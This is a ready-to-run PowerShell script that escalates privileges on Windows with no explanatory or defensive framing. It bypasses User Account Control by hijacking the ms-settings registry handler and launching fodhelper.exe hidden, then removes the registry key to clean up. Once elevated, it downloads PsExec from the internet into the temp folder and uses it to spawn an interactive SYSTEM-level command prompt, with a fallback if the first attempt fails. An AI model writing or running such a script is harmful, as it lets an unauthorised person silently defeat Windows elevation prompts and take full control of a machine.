$CurrentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
$Principal = New-Object Security.Principal.WindowsPrincipal($CurrentIdentity)

if (-not $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[*] Elevating via fodhelper..." -ForegroundColor Yellow
    
    $RegPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    $Command = "powershell.exe -ExecutionPolicy Bypass -NoExit -File `"$PSCommandPath`""
    
    New-Item -Path $RegPath -Force | Out-Null
    New-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $RegPath -Name "(Default)" -Value $Command | Out-Null
    
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 2
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

Write-Host "[+] Running as Administrator" -ForegroundColor Green
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue

$PsExecPath = "$env:TEMP\PsExec64.exe"

if (-not (Test-Path $PsExecPath)) {
    Write-Host "[*] Downloading PsExec64..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri "https://live.sysinternals.com/PsExec64.exe" -OutFile $PsExecPath -UseBasicParsing
}

Write-Host "[+] PsExec path: $PsExecPath" -ForegroundColor Green
Write-Host "[+] File exists: $(Test-Path $PsExecPath)" -ForegroundColor Green

$SessionId = (Get-Process -Id $PID).SessionId
Write-Host "[+] Current session ID: $SessionId" -ForegroundColor Cyan

Write-Host "`n[*] Running PsExec (output below)..." -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor DarkGray

$pinfo = New-Object System.Diagnostics.ProcessStartInfo
$pinfo.FileName = $PsExecPath
$pinfo.Arguments = "-accepteula -i $SessionId -s -d cmd.exe"
$pinfo.RedirectStandardError = $true
$pinfo.RedirectStandardOutput = $true
$pinfo.UseShellExecute = $false
$pinfo.CreateNoWindow = $false

$p = New-Object System.Diagnostics.Process
$p.StartInfo = $pinfo
$p.Start() | Out-Null
$p.WaitForExit(5000) | Out-Null

$stdout = $p.StandardOutput.ReadToEnd()
$stderr = $p.StandardError.ReadToEnd()

Write-Host "STDOUT: $stdout" -ForegroundColor White
Write-Host "STDERR: $stderr" -ForegroundColor Red
Write-Host "Exit code: $($p.ExitCode)" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor DarkGray

if ($p.ExitCode -eq 0) {
    Write-Host "`n[+] Success! Check taskbar for CMD" -ForegroundColor Green
} else {
    Write-Host "`n[-] PsExec failed. Trying alternate method..." -ForegroundColor Yellow
    
    Write-Host "[*] Using service method..." -ForegroundColor Cyan
    & $PsExecPath -accepteula -i -s cmd.exe
}

Write-Host "`nPress any key to exit..." -ForegroundColor Cyan
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
